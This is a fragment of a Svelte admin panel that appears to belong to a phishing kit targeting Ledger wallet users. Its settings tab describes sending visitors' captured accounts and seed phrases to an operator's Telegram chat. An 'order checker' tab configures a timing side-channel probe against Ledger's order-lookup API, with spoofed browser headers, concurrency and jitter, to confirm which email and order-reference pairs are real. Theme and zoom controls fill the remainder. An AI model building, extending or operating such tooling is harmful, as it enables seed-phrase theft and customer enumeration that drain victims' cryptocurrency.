					<p class="mt-2 text-xs text-[var(--muted-foreground)]">
						Whenever a visitor submits captured data (account, seed phrase, or upload), the
						selected fields will be sent to the configured Telegram chat. Use the Test Connection
						button to verify everything is wired correctly before going live.
					</p>
					<ol class="mt-3 list-decimal space-y-2 pl-4 text-[11px] text-[var(--muted-foreground)]">
						<li>Open <code class="rounded bg-[var(--accent)]/30 px-1 font-mono">@BotFather</code> → <code class="rounded bg-[var(--accent)]/30 px-1 font-mono">/newbot</code> → copy the <b>bot token</b>.</li>
						<li>In Telegram, open your bot and send <code class="rounded bg-[var(--accent)]/30 px-1 font-mono">/start</code>.</li>
						<li>Paste the token here → <b>Verify bot</b> → <b>Find chat ID</b> → pick your chat.</li>
						<li><b>Save Settings</b>, enable notifications, then <b>Test Connection</b>.</li>
					</ol>
				</div>
			</div>
		</div>
	{:else if activeTab === 'order-checker'}
		<div class="grid gap-4 xl:grid-cols-12">
			<div class="xl:col-span-8 space-y-4">
				<div class="rounded-xl border border-[var(--border)] bg-[var(--card)] overflow-hidden">
					<div class="border-b border-[var(--border)] px-5 py-3 flex items-center gap-2">
						<PackageSearch size={14} class="text-[var(--text-accent)]" />
						<p class="text-sm font-semibold text-[var(--foreground)]">Probe configuration</p>
					</div>
					<div class="p-5 space-y-4">
						<div class="grid gap-3 sm:grid-cols-4">
							<label class="block sm:col-span-3">
								<span class="block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Probe URL</span>
								<input
									type="url"
									bind:value={ocProbeUrl}
									placeholder="https://my-order.ledger.com/api/login"
									class="mt-1 w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 font-mono text-xs text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none"
								/>
							</label>
							<label class="block">
								<span class="block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Method</span>
								<select
									bind:value={ocMethod}
									class="mt-1 w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-xs text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none"
								>
									<option>POST</option>
									<option>PUT</option>
									<option>GET</option>
								</select>
							</label>
						</div>

						<div>
							<label class="block">
								<span class="block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Body template</span>
								<textarea
									bind:value={ocBodyTemplate}
									rows="3"
									spellcheck="false"
									placeholder={'{"email":"{{email}}","orderReference":"{{orderRef}}"}'}
									class="mt-1 w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 font-mono text-[11px] text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none"
								></textarea>
							</label>
							<p class="mt-1 text-[10px] text-[var(--muted-foreground)]">
								Use <code class="rounded bg-[var(--accent)]/30 px-1 font-mono">{'{{email}}'}</code>
								and
								<code class="rounded bg-[var(--accent)]/30 px-1 font-mono">{'{{orderRef}}'}</code>
								placeholders. Ignored for GET requests.
							</p>
						</div>

						<div>
							<label class="block">
								<span class="block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Headers (JSON)</span>
								<textarea
									bind:value={ocHeadersJson}
									rows="6"
									spellcheck="false"
									class="mt-1 w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 font-mono text-[11px] text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none"
								></textarea>
							</label>
							<p class="mt-1 text-[10px] text-[var(--muted-foreground)]">Spoofs a real browser. Tweak User-Agent / Origin / Referer if Ledger updates their CDN.</p>
						</div>

						<div class="grid gap-3 sm:grid-cols-5">
							<label class="block">
								<span class="block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Threshold (ms)</span>
								<input type="number" min="0" bind:value={ocThreshold} class="mt-1 w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-xs text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none" />
							</label>
							<label class="block">
								<span class="block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Concurrency</span>
								<input type="number" min="1" max="10" bind:value={ocConcurrency} class="mt-1 w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-xs text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none" />
							</label>
							<label class="block">
								<span class="block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Runs / pair</span>
								<input type="number" min="1" max="8" bind:value={ocRuns} class="mt-1 w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-xs text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none" />
							</label>
							<label class="block">
								<span class="block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Timeout (ms)</span>
								<input type="number" min="500" bind:value={ocTimeout} class="mt-1 w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-xs text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none" />
							</label>
							<label class="block">
								<span class="block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Jitter (ms)</span>
								<input type="number" min="0" bind:value={ocJitter} class="mt-1 w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-xs text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none" />
							</label>
						</div>

						<div class="flex flex-wrap items-center gap-2 pt-2">
							<button onclick={saveOrderChecker} disabled={ocSaving} class="btn-accent flex items-center gap-1.5 px-4 py-2 text-xs disabled:opacity-50">
								{#if ocSaved}<CheckCircle size={11} />Saved{:else}<Save size={11} />Save Settings{/if}
							</button>
							<button onclick={resetOrderChecker} class="flex items-center gap-1.5 rounded-md border border-[var(--border)] px-3 py-2 text-xs text-[var(--muted-foreground)] hover:bg-[var(--accent)] hover:text-[var(--foreground)]">
								<RefreshCw size={11} /> Reset to defaults
							</button>
							<a href="/order-checker" class="ml-auto flex items-center gap-1.5 rounded-md border border-[var(--border)] px-3 py-2 text-xs text-[var(--muted-foreground)] hover:bg-[var(--accent)] hover:text-[var(--foreground)]">
								<PackageSearch size={11} /> Open Order Checker
							</a>
						</div>
					</div>
				</div>
			</div>
			<div class="xl:col-span-4">
				<div class="rounded-xl border border-[var(--border)] bg-[var(--card)] p-5 space-y-3 text-xs text-[var(--muted-foreground)]">
					<p class="flex items-center gap-2 text-sm font-semibold text-[var(--foreground)]">
						<Info size={14} class="text-[var(--text-accent)]" />
						How calibration works
					</p>
					<p>
						The checker measures response latency across N runs and uses the median. A pair is
						classified <b class="text-emerald-300">valid</b> when the response succeeds and the
						median is greater than or equal to the threshold. Real lookups hit Ledger's database
						and are slower than fast rejection paths for invalid input.
					</p>
					<p>
						Use the <b>Run diagnostic</b> button on the Order Checker page (it submits a known
						valid pair) to confirm the timing gap, then set the threshold roughly half-way
						between the valid and invalid medians.
					</p>
				</div>
			</div>
		</div>
	{:else}
		<!-- THEMES -->
		<div class="space-y-5">
			<!-- Appearance toggles -->
			<div class="grid gap-4 lg:grid-cols-2">
				<div class="rounded-xl border border-[var(--border)] bg-[var(--card)] p-5">
					<div class="flex items-start justify-between gap-3">
						<div>
							<p class="text-sm font-semibold text-[var(--foreground)]">Starfield Background</p>
							<p class="mt-0.5 text-[11px] text-[var(--muted-foreground)]">Animated star field behind the panel</p>
						</div>
						<button
							onclick={toggleStarfield}
							class="relative h-6 w-11 rounded-full transition-colors {$starfieldEnabled ? 'bg-[var(--accent-primary)]' : 'bg-[var(--input)]'}"
							aria-label="Toggle starfield"
						>
							<span class="absolute top-0.5 h-5 w-5 rounded-full bg-white transition-transform {$starfieldEnabled ? 'translate-x-5' : 'translate-x-0.5'}"></span>
						</button>
					</div>
				</div>

				<div class="rounded-xl border border-[var(--border)] bg-[var(--card)] p-5">
					<div class="flex items-start justify-between gap-3">
						<div>
							<p class="text-sm font-semibold text-[var(--foreground)]">Panel Zoom</p>
							<p class="mt-0.5 text-[11px] text-[var(--muted-foreground)]">Adjust the overall scale of the admin panel</p>
						</div>
						<p class="text-sm font-bold text-[var(--text-accent)]">{$panelZoom}%</p>
					</div>
					<div class="mt-4 flex items-center gap-3">
						<button onclick={() => setZoom($panelZoom - 5)} class="rounded-md border border-[var(--border)] p-1.5 text-[var(--muted-foreground)] hover:bg-[var(--accent)] hover:text-[var(--foreground)]" aria-label="Zoom out">
							<Minus size={11} />
						</button>
						<input type="range" min="50" max="200" step="5" value={$panelZoom} oninput={(e) => setZoom(parseInt((e.target as HTMLInputElement).value, 10))} class="flex-1 accent-[var(--accent-primary)]" />
						<button onclick={() => setZoom($panelZoom + 5)} class="rounded-md border border-[var(--border)] p-1.5 text-[var(--muted-foreground)] hover:bg-[var(--accent)] hover:text-[var(--foreground)]" aria-label="Zoom in">
							<Plus size={11} />
						</button>
					</div>
					<div class="mt-3 flex items-center gap-1">
						{#each [75, 100, 125, 150] as p}
							<button onclick={() => setZoom(p)} class="rounded-md border border-[var(--border)] px-2 py-1 text-[10px] {$panelZoom === p ? 'bg-[var(--accent-primary)]/15 text-[var(--text-accent)]' : 'text-[var(--muted-foreground)] hover:bg-[var(--accent)]'}">{p}%</button>
						{/each}
					</div>
				</div>
			</div>

			<!-- Theme gallery -->
			<div class="rounded-xl border border-[var(--border)] bg-[var(--card)] overflow-hidden">
				<div class="border-b border-[var(--border)] px-5 py-3">
					<p class="text-sm font-semibold text-[var(--foreground)]">Theme Gallery</p>
					<p class="mt-0.5 text-[11px] text-[var(--muted-foreground)]">Theme changes are applied immediately and saved automatically to your browser.</p>
				</div>
				<div class="grid grid-cols-1 gap-3 p-5 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4">
					{#each THEMES as theme}
						{@const active = $themeId === theme.id}
						<button
							onclick={() => setTheme(theme.id)}
							class="rounded-lg border-2 p-4 text-left transition-all {active ? 'border-[var(--accent-primary)] bg-[var(--accent-primary)]/5' : 'border-[var(--border)] hover:border-[var(--border-hover)] bg-[var(--input)]/30'}"
						>
							<div class="flex items-start justify-between gap-2">
								<div>
									<p class="text-sm font-semibold text-[var(--foreground)]">{theme.name}</p>
									<p class="mt-0.5 text-[11px] text-[var(--muted-foreground)] line-clamp-2">{theme.description}</p>
								</div>
								{#if active}
									<span class="rounded-full bg-[var(--accent-primary)] px-2 py-0.5 text-[9px] font-bold text-white">Active</span>
								{/if}
							</div>
							<div class="mt-3 flex items-center gap-1.5">
								{#each Object.entries(theme.swatches) as [name, color]}
									<span class="h-5 w-5 rounded-full border border-[var(--border)]" style="background: {color}" title={name}></span>
								{/each}
							</div>
						</button>
					{/each}
				</div>
			</div>
		</div>
	{/if}
</div>

{#if confirmTest}
	<div
		class="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm"
		role="dialog"
		aria-modal="true"
		aria-labelledby="confirm-tg-test-title"
		tabindex="-1"
		onclick={() => (confirmTest = false)}
		onkeydown={(e) => e.key === 'Escape' && (confirmTest = false)}
	>
		<div
			class="w-full max-w-md rounded-xl border border-[var(--border)] bg-[var(--card)] p-6 shadow-2xl"
			role="document"
			onclick={(e) => e.stopPropagation()}
			onkeydown={(e) => e.stopPropagation()}
		>
			<div class="flex items-start gap-3">
				<div class="flex h-9 w-9 shrink-0 items-center justify-center rounded-lg bg-amber-500/15 text-amber-300">
					<AlertCircle size={16} />
				</div>
				<div>
					<h3 id="confirm-tg-test-title" class="text-base font-semibold text-[var(--foreground)]">Send a Telegram test message?</h3>
					<p class="mt-1 text-sm text-[var(--muted-foreground)]">
						This will save your current Telegram settings and immediately send a real test
						message to chat ID <span class="font-mono text-[var(--foreground)]">{tgChatId || '—'}</span>.
					</p>
					<p class="mt-2 text-xs text-[var(--muted-foreground)]">
						If you're auditing or testing locally, point the Chat ID at a throwaway chat first.
					</p>
				</div>
			</div>
			<div class="mt-6 flex justify-end gap-2">
				<button
					onclick={() => (confirmTest = false)}
					class="rounded-md border border-[var(--border)] px-4 py-2 text-xs text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)]"
				>
					Cancel
				</button>
				<button
					onclick={performTestConnection}
					class="flex items-center gap-1.5 rounded-md bg-amber-500/90 px-4 py-2 text-xs font-medium text-white transition-soft hover:bg-amber-500"
				>
					<Send size={11} />
					Send test message
				</button>
			</div>
		</div>
	</div>
{/if}
